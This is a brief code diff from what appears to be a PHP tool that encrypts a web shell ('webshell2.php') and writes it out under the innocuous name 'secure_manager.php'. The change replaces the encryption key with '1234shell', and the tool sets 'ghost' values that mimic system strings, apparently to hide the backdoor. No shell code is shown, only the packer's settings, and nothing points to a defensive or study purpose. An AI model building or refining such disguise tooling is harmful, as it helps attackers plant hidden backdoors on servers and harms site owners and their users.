@@ -6,7 +6,7 @@
 
 $source_file    = 'webshell2.php';
 $output_name    = 'secure_manager.php';
-$encryption_key = 'secretNNEA1rFUqyfgoY8zNYSkvefrsbmdDdixTApahs2WhkvKMCf7PQ2uobMP';
+$encryption_key = '1234shell';
 $ghost_key      = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM';
 $ghost_val      = 'SYSTEM32LOGFILEINSTANCE';
 
